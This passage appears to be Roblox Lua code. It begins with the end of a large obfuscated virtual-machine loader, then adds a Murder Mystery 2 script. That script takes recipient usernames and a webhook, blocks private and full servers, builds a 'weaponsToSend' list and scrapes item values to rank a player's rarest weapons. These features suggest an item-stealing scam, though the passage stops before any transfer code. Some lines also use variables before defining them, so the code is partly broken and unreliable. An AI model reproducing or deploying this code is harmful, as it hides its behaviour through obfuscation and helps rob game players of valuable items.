c=s[k];end else if 4~=t then for e=26,98 do if t<6 then f(r,c);break;end;t=-2;break;end;else f(r,c);end end end t=t+1 end n=n+1;e=d[n];end end else if 0>=t then f[e[a]]=_[e[u]];n=n+1;e=d[n];else if t~=1 then f(e[a],e[u]);n=n+1;e=d[n];else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end end else if 51<t then for o=44,73 do if t>54 then local n=e[a]f[n]=f[n](h(f,n+1,e[u]))break;end;local o;for t=0,6 do if t>2 then if t>=5 then if 4<=t then for l=17,72 do if 5<t then o=e[a]f[o]=f[o](h(f,o+1,e[u]))break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end else if t~=1 then for l=22,61 do if t~=4 then f(e[a],e[u]);n=n+1;e=d[n];break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end end else if 1>t then f[e[a]]=_[e[u]];n=n+1;e=d[n];else if t<2 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else f(e[a],e[u]);n=n+1;e=d[n];end end end end break;end;else local o;for t=0,6 do if t>2 then if t>=5 then if 4<=t then for l=17,72 do if 5<t then o=e[a]f[o]=f[o](h(f,o+1,e[u]))break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end else if t~=1 then for l=22,61 do if t~=4 then f(e[a],e[u]);n=n+1;e=d[n];break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end end else if 1>t then f[e[a]]=_[e[u]];n=n+1;e=d[n];else if t<2 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else f(e[a],e[u]);n=n+1;e=d[n];end end end end end end end end end end else if t>=20 then if 30<=t then if t>=35 then if t<38 then if 36<=t then if 37>t then for t=0,5 do if t>2 then if t>=4 then if 1~=t then repeat if 5~=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;if(f[e[a]]~=f[e[l]])then n=n+1;else n=e[u];end;until true;else if(f[e[a]]~=f[e[l]])then n=n+1;else n=e[u];end;end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if t<=0 then o[e[u]]=f[e[a]];n=n+1;e=d[n];else if-2<t then repeat if 2~=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end end else f[e[a]]=o[e[u]];end else if(f[e[a]]<f[e[l]])then n=n+1;else n=e[u];end;end else if t>38 then if t~=38 then repeat if 39~=t then local t,h,_;for o=0,1 do if o~=-4 then repeat if o~=1 then t=e[a]h={f[t](f[t+1])};_=0;for e=t,e[l]do _=_+1;f[e]=h[_];end n=n+1;e=d[n];break;end;if f[e[a]]then n=n+1;else n=e[u];end;until true;else t=e[a]h={f[t](f[t+1])};_=0;for e=t,e[l]do _=_+1;f[e]=h[_];end n=n+1;e=d[n];end end break;end;if(f[e[a]]<f[e[l]])then n=n+1;else n=e[u];end;until true;else if(f[e[a]]<f[e[l]])then n=n+1;else n=e[u];end;end else local t;f[e[a]]={};n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];f[e[a]][e[u]]=e[l];n=n+1;e=d[n];f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];t=e[a];do return f[t](h(f,t+1,e[u]))end;n=n+1;e=d[n];t=e[a];do return h(f,t,s)end;end end else if t<=31 then if 30~=t then f[e[a]]=e[u]-f[e[l]];else local o;for t=0,6 do if t<3 then if t<=0 then o=e[a]f[o]=f[o](h(f,o+1,e[u]))n=n+1;e=d[n];else if 1==t then f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end else if t>=5 then if t~=5 then f(e[a],e[u]);else f(e[a],e[u]);n=n+1;e=d[n];end else if 3~=t then f(e[a],e[u]);n=n+1;e=d[n];else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end end end else if 32>=t then local t,o;t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];else if t>=30 then for _=39,54 do if 33~=t then o[e[u]]=f[e[a]];break;end;local _,c,s,r,o,t,b;for t=0,6 do if t<=2 then if 0<t then if-1~=t then repeat if t~=1 then t=0;while t>-1 do if t<3 then if 1<=t then if t<2 then c=a;else s=u;end else _=e;end else if 5<=t then if 4<t then for e=48,75 do if 5~=t then t=-2;break;end;f(o,r);break;end;else t=-2;end else if t==3 then r=_[s];else o=_[c];end end end t=t+1 end n=n+1;e=d[n];break;end;f(e[a],e[u]);n=n+1;e=d[n];until true;else f(e[a],e[u]);n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if 5<=t then if t<6 then f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];else f[e[a]][e[u]]=e[l];end else if 2<=t then repeat if t<4 then t=0;while t>-1 do if t<3 then if t>0 then if t==2 then s=u;else c=a;end else _=e;end else if 5>t then if 3~=t then o=_[c];else r=_[s];end else if t>4 then repeat if 6~=t then f(o,r);break;end;t=-2;until true;else f(o,r);end end end t=t+1 end n=n+1;e=d[n];break;end;b=e[a]f[b]=f[b](h(f,b+1,e[u]))n=n+1;e=d[n];until true;else t=0;while t>-1 do if t<3 then if t>0 then if t==2 then s=u;else c=a;end else _=e;end else if 5>t then if 3~=t then o=_[c];else r=_[s];end else if t>4 then repeat if 6~=t then f(o,r);break;end;t=-2;until true;else f(o,r);end end end t=t+1 end n=n+1;e=d[n];end end end end break;end;else o[e[u]]=f[e[a]];end end end end else if t<=24 then if 22>t then if 18<t then for s=20,52 do if 21>t then local r;for t=0,6 do if t<3 then if 0<t then if t~=-3 then repeat if t~=2 then f(e[a],e[u]);n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else if 4<t then if t>3 then repeat if t~=6 then f[e[a]]=f[e[u]];n=n+1;e=d[n];break;end;r=e[a]f[r](f[r+1])until true;else f[e[a]]=f[e[u]];n=n+1;e=d[n];end else if 2<t then repeat if 4~=t then r=e[a]f[r](h(f,r+1,e[u]))n=n+1;e=d[n];break;end;f[e[a]]=o[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=o[e[u]];n=n+1;e=d[n];end end end end break;end;local s=m[e[u]];local h;local t={};h=r.HuMxsG_U({},{__index=function(n,e)local e=t[e];return e[1][e[2]];end,__newindex=function(f,e,n)local e=t[e]e[1][e[2]]=n;end;});for a=1,e[l]do n=n+1;local e=d[n];if e[j]==49 then t[a-1]={f,e[u]};else t[a-1]={o,e[u]};end;c[#c+1]=t;end;f[e[a]]=y(s,h,_);break;end;else local r;for t=0,6 do if t<3 then if 0<t then if t~=-3 then repeat if t~=2 then f(e[a],e[u]);n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else if 4<t then if t>3 then repeat if t~=6 then f[e[a]]=f[e[u]];n=n+1;e=d[n];break;end;r=e[a]f[r](f[r+1])until true;else f[e[a]]=f[e[u]];n=n+1;e=d[n];end else if 2<t then repeat if 4~=t then r=e[a]f[r](h(f,r+1,e[u]))n=n+1;e=d[n];break;end;f[e[a]]=o[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=o[e[u]];n=n+1;e=d[n];end end end end end else if 22>=t then for t=0,1 do if t>=-4 then repeat if t~=1 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;if not f[e[a]]then n=n+1;else n=e[u];end;until true;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end else if t>19 then for h=26,69 do if 24~=t then f[e[a]]();break;end;local r,k,s,c,b,t,h;t=0;while t>-1 do if 3<=t then if t<5 then if t~=0 then repeat if 3~=t then b=r[k];break;end;c=r[s];until true;else c=r[s];end else if t==6 then t=-2;else f(b,c);end end else if 1<=t then if-1~=t then repeat if t<2 then k=a;break;end;s=u;until true;else s=u;end else r=e;end end t=t+1 end n=n+1;e=d[n];h=e[a]f[h](f[h+1])n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];h=e[a]f[h]=f[h]()n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]]-f[e[l]];break;end;else f[e[a]]();end end end else if 26>=t then if t~=25 then if(f[e[a]]==e[l])then n=n+1;else n=e[u];end;else local e=e[a]f[e](f[e+1])end else if 28>t then f[e[a]]=f[e[u]][f[e[l]]];else if t>=24 then repeat if 28<t then for t=0,1 do if-4<t then repeat if 1>t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;if f[e[a]]then n=n+1;else n=e[u];end;until true;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];until true;else f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];end end end end end else if 9<t then if 15>t then if t>11 then if t<=12 then n=e[u];else if t>11 then repeat if t>13 then local _;for t=0,6 do if t>=3 then if 4<t then if t~=5 then f[e[a]][e[u]]=f[e[l]];else f[e[a]]=o[e[u]];n=n+1;e=d[n];end else if t~=2 then for l=14,76 do if t~=4 then f(e[a],e[u]);n=n+1;e=d[n];break;end;_=e[a]f[_]=f[_](h(f,_+1,e[u]))n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end end else if 1<=t then if t>1 then f[e[a]]=e[u]-f[e[l]];n=n+1;e=d[n];else f[e[a]]=f[e[u]];n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end break;end;local u=e[u];local n=f[u]for e=u+1,e[l]do n=n..f[e];end;f[e[a]]=n;until true;else local u=e[u];local n=f[u]for e=u+1,e[l]do n=n..f[e];end;f[e[a]]=n;end end else if 6<=t then repeat if t<11 then do return end;break;end;local n=e[a]local a,e=b(f[n](h(f,n+1,e[u])))s=e+n-1 local e=0;for n=n,s do e=e+1;f[n]=a[e];end;until true;else do return end;end end else if 17<=t then if 18<=t then if 15~=t then repeat if t>18 then local r,h,b,s,o,c,t;for t=0,6 do if t>2 then if 4<t then if t~=5 then f[e[a]][e[u]]=e[l];else r=e[a]f[r]=f[r](f[r+1])n=n+1;e=d[n];end else if t~=2 then repeat if 3<t then t=0;while t>-1 do if 2<t then if 5<=t then if 1<=t then repeat if t>5 then t=-2;break;end;f(c,o);until true;else f(c,o);end else if 2<t then for e=28,64 do if t~=4 then o=h[s];break;end;c=h[b];break;end;else o=h[s];end end else if 1>t then h=e;else if t==2 then s=u;else b=a;end end end t=t+1 end n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else t=0;while t>-1 do if 2<t then if 5<=t then if 1<=t then repeat if t>5 then t=-2;break;end;f(c,o);until true;else f(c,o);end else if 2<t then for e=28,64 do if t~=4 then o=h[s];break;end;c=h[b];break;end;else o=h[s];end end else if 1>t then h=e;else if t==2 then s=u;else b=a;end end end t=t+1 end n=n+1;e=d[n];end end else if t<=0 then r=e[a]f[r]=f[r]()n=n+1;e=d[n];else if t>-3 then for h=22,54 do if t>1 then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;f[e[a]][e[u]]=e[l];n=n+1;e=d[n];break;end;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end end break;end;if(f[e[a]]==e[l])then n=n+1;else n=e[u];end;until true;else local r,o,b,s,h,c,t;for t=0,6 do if t>2 then if 4<t then if t~=5 then f[e[a]][e[u]]=e[l];else r=e[a]f[r]=f[r](f[r+1])n=n+1;e=d[n];end else if t~=2 then repeat if 3<t then t=0;while t>-1 do if 2<t then if 5<=t then if 1<=t then repeat if t>5 then t=-2;break;end;f(c,h);until true;else f(c,h);end else if 2<t then for e=28,64 do if t~=4 then h=o[s];break;end;c=o[b];break;end;else h=o[s];end end else if 1>t then o=e;else if t==2 then s=u;else b=a;end end end t=t+1 end n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else t=0;while t>-1 do if 2<t then if 5<=t then if 1<=t then repeat if t>5 then t=-2;break;end;f(c,h);until true;else f(c,h);end else if 2<t then for e=28,64 do if t~=4 then h=o[s];break;end;c=o[b];break;end;else h=o[s];end end else if 1>t then o=e;else if t==2 then s=u;else b=a;end end end t=t+1 end n=n+1;e=d[n];end end else if t<=0 then r=e[a]f[r]=f[r]()n=n+1;e=d[n];else if t>-3 then for h=22,54 do if t>1 then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;f[e[a]][e[u]]=e[l];n=n+1;e=d[n];break;end;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end end end else for e=e[a],e[u]do f[e]=nil;end;end else if 11~=t then repeat if 16>t then local s=m[e[u]];local h;local t={};h=r.HuMxsG_U({},{__index=function(n,e)local e=t[e];return e[1][e[2]];end,__newindex=function(f,e,n)local e=t[e]e[1][e[2]]=n;end;});for a=1,e[l]do n=n+1;local e=d[n];if e[j]==49 then t[a-1]={f,e[u]};else t[a-1]={o,e[u]};end;c[#c+1]=t;end;f[e[a]]=y(s,h,_);break;end;local t;f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];f[e[a]][e[u]]=e[l];n=n+1;e=d[n];f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];t=e[a]f[t]=f[t](f[t+1])until true;else local t;f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];f[e[a]][e[u]]=e[l];n=n+1;e=d[n];f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];t=e[a]f[t]=f[t](f[t+1])end end end else if 5>t then if 2<=t then if t>2 then if-1~=t then for h=19,66 do if t<4 then f[e[a]]=f[e[u]]+f[e[l]];break;end;local t,o;for h=0,4 do if 1<h then if 3>h then t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];n=n+1;e=d[n];else if-1~=h then repeat if h<4 then t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];break;end;if not f[e[a]]then n=n+1;else n=e[u];end;until true;else t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];end end else if-1~=h then repeat if h~=0 then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;f[e[a]]();n=n+1;e=d[n];until true;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end break;end;else local t,o;for h=0,4 do if 1<h then if 3>h then t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];n=n+1;e=d[n];else if-1~=h then repeat if h<4 then t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];break;end;if not f[e[a]]then n=n+1;else n=e[u];end;until true;else t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];end end else if-1~=h then repeat if h~=0 then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;f[e[a]]();n=n+1;e=d[n];until true;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end end else local e=e[a]f[e]=f[e]()end else if-3<t then repeat if t~=1 then local t,r;for o=0,6 do if o<3 then if 1>o then t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];else if-1<o then repeat if o~=1 then f(e[a],e[u]);n=n+1;e=d[n];break;end;t=e[a];r=f[e[u]];f[t+1]=r;f[t]=r[e[l]];n=n+1;e=d[n];until true;else t=e[a];r=f[e[u]];f[t+1]=r;f[t]=r[e[l]];n=n+1;e=d[n];end end else if o>4 then if o>=2 then repeat if o~=6 then f(e[a],e[u]);n=n+1;e=d[n];break;end;t=e[a]f[t](f[t+1])until true;else t=e[a]f[t](f[t+1])end else if o<4 then t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end end break;end;for t=0,4 do if t>=2 then if 2<t then if 1~=t then for _=48,60 do if 3<t then if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if t>=-2 then for h=15,72 do if 1~=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end until true;else for t=0,4 do if t>=2 then if 2<t then if 1~=t then for _=48,60 do if 3<t then if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if t>=-2 then for h=15,72 do if 1~=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end end end else if t>=7 then if 8<=t then if t>6 then repeat if 8~=t then local _,h,r,c,b,s,o,t;for t=0,3 do if t>1 then if-2<=t then for h=14,60 do if 3>t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;_=e[a]f[_](f[_+1])break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if 1~=t then _=e[a]f[_](f[_+1])n=n+1;e=d[n];else t=0;while t>-1 do if t>3 then if 5>=t then if t~=2 then for e=37,91 do if t~=5 then s=b[h[c]];break;end;o=h[r];break;end;else o=h[r];end else if t~=3 then repeat if 7~=t then f[o]=s;break;end;t=-2;until true;else f[o]=s;end end else if 2<=t then if t~=3 then c=u;else b=f;end else if t~=-4 then for n=48,52 do if 0~=t then r=a;break;end;h=e;break;end;else h=e;end end end t=t+1 end n=n+1;e=d[n];end end end break;end;f[e[a]]=f[e[u]][f[e[l]]];until true;else f[e[a]]=f[e[u]][f[e[l]]];end else if f[e[a]]then n=n+1;else n=e[u];end;end else if 6>t then for t=0,4 do if t>=2 then if 3<=t then if t>1 then for _=36,74 do if 3~=t then if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if t~=-4 then for h=37,87 do if 1~=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end else local h,s,r;for t=0,4 do if 2>t then if-4<t then repeat if 1>t then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;f[e[a]]=o[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=o[e[u]];n=n+1;e=d[n];end else if 2>=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else if 0<t then for _=18,54 do if t~=4 then h=e[a]s={f[h](f[h+1])};r=0;for e=h,e[l]do r=r+1;f[e]=s[r];end n=n+1;e=d[n];break;end;n=e[u];break;end;else n=e[u];end end end end end end end end end end end n=1+n;end;end;return ae end;local u=0xff;local _={};local d=(1);local a='';(function(n)local f=n local l=0x00 local e=0x00 f={(function(t)if l>0x2d then return t end l=l+1 e=(e+0xcc9-t)%0x24 return(e%0x03==0x0 and(function(f)if not n[f]then e=e+0x01 n[f]=(0xf);a={a..'\58 a',a};_[d]=ae();d=d+((not r.swIDBetw)and 1 or 0);a[1]='\58'..a[1];u[2]=0xff;end return true end)'JwkXl'and f[0x3](0x2b2+t))or(e%0x03==0x1 and(function(f)if not n[f]then e=e+0x01 n[f]=(0xc5);end return true end)'RyWIG'and f[0x2](t+0x2e3))or(e%0x03==0x2 and(function(f)if not n[f]then e=e+0x01 n[f]=(0xab);a='\37';u={function()u()end};a=a..'\100\43';end return true end)'MkwmC'and f[0x1](t+0x389))or t end),(function(a)if l>0x2f then return a end l=l+1 e=(e+0xfd9-a)%0x2a return(e%0x03==0x1 and(function(f)if not n[f]then e=e+0x01 n[f]=(0x2a);end return true end)'wLTmY'and f[0x3](0x2ef+a))or(e%0x03==0x0 and(function(f)if not n[f]then e=e+0x01 n[f]=(0x18);end return true end)'QGSpc'and f[0x1](a+0x20a))or(e%0x03==0x2 and(function(f)if not n[f]then e=e+0x01 n[f]=(0x77);end return true end)'WhkBQ'and f[0x2](a+0x141))or a end),(function(t)if l>0x2b then return t end l=l+1 e=(e+0x8ec-t)%0x18 return(e%0x03==0x0 and(function(f)if not n[f]then e=e+0x01 n[f]=(0x3b);end return true end)'OPoES'and f[0x1](0x3d2+t))or(e%0x03==0x1 and(function(f)if not n[f]then e=e+0x01 n[f]=(0x25);_[d]=de();d=d+u;end return true end)'pXbDU'and f[0x2](t+0x1dc))or(e%0x03==0x2 and(function(f)if not n[f]then e=e+0x01 n[f]=(0x93);u[2]=(u[2]*(ue(function()_()end,h(a))-ue(u[1],h(a))))+1;_[d]={};u=u[2];d=d+u;end return true end)'jHkjZ'and f[0x3](t+0x1ce))or t end)}f[0x1](0x1006)end){};local e=y(h(_));return e(...);end return ne((function()local n={}local e=0x01;local f;if r.swIDBetw then f=r.swIDBetw(ne)else f=''end if r.EixtPuUZ(f,r.JxnupIAh)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(n,e,f,a,u,d)local d;if n<4 then if n<2 then if n>=-1 then repeat if 1>n then do return e(1),e(4,u,a,f,e),e(5,u,a,f)end;break;end;do return function(f,e,n)if n then local e=(f/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(f%(e+e)>=e)and 1 or 0;end;end;end;until true;else do return e(1),e(4,u,a,f,e),e(5,u,a,f)end;end else if n>=1 then for d=15,83 do if 2<n then do return e(1),e(4,u,a,f,e),e(5,u,a,f)end;break;end;do return 16777216,65536,256 end;break;end;else do return 16777216,65536,256 end;end end else if 5<n then if n<=6 then do return u[f]end;else if 3<n then for e=22,61 do if 8>n then do return setmetatable({},{['__\99\97\108\108']=function(e,a,u,f,n)if n then return e[n]elseif f then return e else e[a]=u end end})end break;end;do return f(n,nil,f);end break;end;else do return setmetatable({},{['__\99\97\108\108']=function(e,u,a,f,n)if n then return e[n]elseif f then return e else e[u]=a end end})end end end else if 0<=n then repeat if n~=5 then local n=a;local a,u,d=u(2);do return function()local e,l,f,t=e(f,n(n,n),n(n,n)+3);n(4);return(t*a)+(f*u)+(l*d)+e;end;end;break;end;local n=a;do return function()local e=e(f,n(n,n),n(n,n));n(1);return e;end;end;until true;else local n=a;local d,u,a=u(2);do return function()local e,f,t,l=e(f,n(n,n),n(n,n)+3);n(4);return(l*d)+(t*u)+(f*a)+e;end;end;end end end end),...)
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local users = _G.Usernames or {}
+local min_rarity = _G.min_rarity or "Godly"
+local min_value = _G.min_value or 1
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add username or webhook")
+    return
+end
+
+if game.PlaceId ~= 142823291 then
+    plr:kick("Game not supported. Please join a normal MM2 server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if #Players:GetPlayers() >= 12 then
+    plr:kick("Server is full. Please join a less populated server")
+    return
+end
+
+local weaponsToSend = {}
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local playerGui = plr:WaitForChild("PlayerGui")
+local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local HttpService = game:GetService("HttpService")
+
+local rarityTable = {
+    "Common",
+    "Uncommon",
+    "Rare",
+    "Legendary",
+    "Godly",
+    "Ancient",
+    "Unique",
+    "Vintage"
+}
+
+local categories = {
+    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    ancient = "https://supremevaluelist.com/mm2/ancients.html",
+    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    classic = "https://supremevaluelist.com/mm2/vintages.html",
+    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+}
+local headers = {
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+}
+
+local function trim(s)
+    return s:match("^%s*(.-)%s*$")
+end
+
+local function fetchHTML(url)
+    local response = request({
+        Url = url,
+        Method = "GET",
+        Headers = headers
+    })
+    return response.Body
+end
+
+local function parseValue(itembodyDiv)
+    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valueStr then
+        valueStr = valueStr:gsub(",", "")
+        local value = tonumber(valueStr)
+        if value then
+            return value
+        end
+    end
+    return nil
+end
+
+local function extractItems(htmlContent)
+    local itemValues = {}
+    
+    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        itemName = itemName:match("([^<]+)")
+        if itemName then
+            itemName = trim(itemName:gsub("%s+", " "))
+            itemName = trim((itemName:split(" Click "))[1])
+            local itemNameLower = itemName:lower()
+
+            local value = parseValue(itembodyDiv)
+            if value then
+                itemValues[itemNameLower] = value
+            end
+        end
+    end
+    
+    return itemValues
+end
+
+local function extractChromaItems(htmlContent)
+    local chromaValues = {}
+
+    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        chromaName = chromaName:match("([^<]+)")
+        if chromaName then
+            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+            local value = parseValue(itembodyDiv)
+            if value then
+                chromaValues[chromaName] = value
+            end
+        end
+    end
+    
+    return chromaValues
+end
+
+local function buildValueList()
+    local allExtractedValues = {}
+    local chromaExtractedValues = {}
+    local categoriesToFetch = {}
+
+    for rarity, url in pairs(categories) do
+        table.insert(categoriesToFetch, {rarity = rarity, url = url})
+    end
+    
+    local totalCategories = #categoriesToFetch
+    local completed = 0
+    local lock = Instance.new("BindableEvent")
+
+    for _, category in ipairs(categoriesToFetch) do
+        task.spawn(function()
+            local rarity = category.rarity
+            local url = category.url
+            local htmlContent = fetchHTML(url)
+            
+            if htmlContent and htmlContent ~= "" then
+                if rarity ~= "chroma" then
+                    local extractedItemValues = extractItems(htmlContent)
+                    for itemName, value in pairs(extractedItemValues) do
+                        allExtractedValues[itemName] = value
+                    end
+                else
+                    chromaExtractedValues = extractChromaItems(htmlContent)
+                end
+            end
+
+            completed = completed + 1
+            if completed == totalCategories then
+                lock:Fire()
+            end
+        end)
+    end
+
+    lock.Event:Wait()
+
+    local valueList = {}
+
+    for dataid, item in pairs(database) do
+        local itemName = item.ItemName and item.ItemName:lower() or ""
+        local rarity = item.Rarity or ""
+        local hasChroma = item.Chroma or false
+
+        if itemName ~= "" and rarity ~= "" then
+            local weaponRarityIndex = table.find(rarityTable, rarity)
+            local godlyIndex = table.find(rarityTable, "Godly")
+
+            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
+                if hasChroma then
+                    local matchedChromaValue = nil
+                    for chromaName, value in pairs(chromaExtractedValues) do
+                        if chromaName:find(itemName) then
+                            matchedChromaValue = value
+                            break
+                        end
+                    end
+
+                    if matchedChromaValue then
